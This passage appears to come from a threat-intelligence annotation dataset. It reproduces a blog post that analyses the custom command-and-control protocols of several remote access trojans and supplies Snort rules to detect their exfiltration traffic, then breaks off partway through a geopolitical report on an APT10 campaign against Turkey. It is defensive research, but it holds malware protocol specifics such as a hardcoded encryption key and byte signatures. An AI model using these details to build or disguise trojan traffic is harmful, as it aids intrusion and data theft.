reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0096,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/dev/lab52_2020-05-14_the-energy-reserves-in-the.txt,lab52_2020-05-14_the-energy-reserves-in-the,G0045,"The energy reserves in the Eastern Mediterranean Sea and a malicious campaign of APT10 against Turkey May 14, 2020 Energy reserves in the Eastern Mediterranean Sea and the “MEDEAST” gas pipeline: The Mediterranean Sea has become an increasingly relevant geostrategic topic for the Ministries of Foreign Affairs of Turkey, Greece, Cyprus, Israel and even China due to the controversies generated during the last decade for the discoveries of natural gas resources located in the Eastern Mediterranean seas of States such Israel, Cyprus and Egypt ([1]). The presence of Turkish troops in Libya and Syria, and the Franco-Greek alliance to avoid Turkish intrusions in the maritime territory of Greece show the relevance and global interest in energy resources in the area. As it could be seen in the following map, part of the geostrategic conflict is focused on the Turkish EEZ. Turkey carried out an agreement with Libya which tries to carry out an expansion of its exclusive maritime economic zones ([2]). It is relevant to clarify that an EEZ is a maritime zone prescribed by the United Nations Convention on the law of the sea over which a state has special rights regarding the exploration and exploitation of sea resources, including the production of energy through the water and wind ([3]) ([17]): ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-1-1024x678.png) *Illustration 1.Expansion of Turkish EEZ* The expansion that the Turkish government tries to carry out could increase the geopolitical risk among Cypriots, Greeks and even Israeli governments. The military presence in the area by those States could be seen in the map shown above. The strategy of increasing Turkey’s EEZ would leave without an important part of the continental shelf Athens ([4]). In addition, Cyprus is significantly affected by this EEZ’s expansion as there is an occupation of the Cyprus’ EEZ area. Furthermore, the President Erdogan has publicly declared that his oil exploration projects in the coast of Cyprus will not cease. Turkey tries to stablish a zone of EEZ controlled by the Turkish influence which would be represented as in the following map ([5]): ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-2.png) *Illustration 2.Expansion of the Turkish EEZ and location of energy resources* In the previous map, you can see which energy exploration areas are located in Israel, Cyprus and Egypt. Moreover, these States give diplomatic support to Cyprus and Greece regarding the expansion’s conflict of the Turkish EEZ. Furthermore, the 27th of February of 2020, Greece, Cyprus and Israel signed an agreement to build up a gas pipeline to transport gas to Europe from the Leviathan gas reserves located in Israel. Moreover, in the near future there is the intention of joining to the pipeline the extractions from the Cypriot gas reserves, Aphrodite and Calypso ([6]). ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-3.png) *Illustration 3.Mediterranean Gas Pipeline* Turkey has displaced several warships to the coast of Cyprus in order to carry out gas exploration projects. The Eastern European gas pipeline reduces the geopolitical power of Turkey as it tries to exclude Turkey from any participation in it. This “pipeline” has been called “EastMed” ([6]). However, during March, Turkey will put an offshore drilling vessel in order to continue with its oil exploration projects in the EEZ waters of Greece, Cyprus and the EU in order to try to acquire in the future the role of gas supplier for the EU ([8]). Interests and influence of China in the Mediterranean area: China, unlike the US diplomatic-military expansionism, has focused its expansionist strategy on the diplomatic-commercial strategy. For China, one of its geo-strategically key regions, has been the Port of Piraeus of Greece. The Greek government tendered for the next 35 years the 67% of the Port’s operations to COSCO (China Ocean Shipping Company) for 368.5 million and 350 million of euros to be invested in the Piraeus’ port infrastructure ([9]). The Port of Piraeus represents a potential gate of all the commercial flow that comes from the OBOR sea route. In addition, during November of 2019, China and Greece signed up 16 cooperation agreements of different matters, including trade and energy investments ([10]). On the other hand, Cyprus signed an agreement with a consortium led by China to build up the first natural gas import terminal in Cyprus. The terminal is designed to convert imported liquefied gas into a gaseous form to be used in energy plants ([11]). The construction is being developed by China Petroleum Pipeline Engineering, Metron, Hudong-Zhngua Shipbuilding and Wilhelmsen Ship Management. Construction is expected to be done in 2022. Regarding the international security, China investigates Turkey’s relation with the Uighur community. The Uyghurs are Turkish-speaking people from the interior of Asia and mostly of them have Muslim religious confession. The Uyghurs live in northwestern China, in the Uyghur autonomous region of Xinjiang and are considered a threat to the People’s Republic of China as they are considered largely jihadist terrorists ([12]). Turkey is the country that has given the most international support to the Uyghur community. Currently, up to 45,000 Uyghur refugees live in Turkey on a temporary visa or even with a permanent residence permit ([13]). Turkey’s foreign affairs policies are misaligned from those of China. The possible obstruction of the OBOR route to the Port of Piraeus and the collaborative policies with the Uyghur community in the Xinjiang region of China could damage their diplomatic relations. Due to the diplomatic confrontations and conflicting interests of the two countries, China could carry out cyber espionage operations against Turkish organizations and institutions linked to diplomacy, defense, energy, telecommunications and foreign trade. Its main objective could be to collect confidential information in order to gain advantages within the future geostrategic movements of Turkey and the rest of the actors involved in the conflicts over the energy resources located in the Mediterranean Sea. Malicious campaign against Turkish organizations: A malicious campaign allegedly attributed to APT10 against Turkish organizations from various sectors such as telecommunications and finance has been identified by Adeo in January of 2020 ([14]). APT10 is a group presumably attributed to the Ministry of State Security of China ([15]). In addition, it is a group that usually targets organizations from various sectors such as defense, energy, health, telecommunications, governments, military, shipping and IT ([16]). It has been identified that APT10 usually carries out malicious campaigns against organizations that could damage the China’s State interests into the global market. On the other hand, it has also been detected that APT10 usually carries out malicious campaigns against organizations that support foundations which carry out aid projects with ethnic groups that may be a potential threat against the Chinese national security, as the case of the Uyghur community. Moreover, in this campaign has been identified several similarities 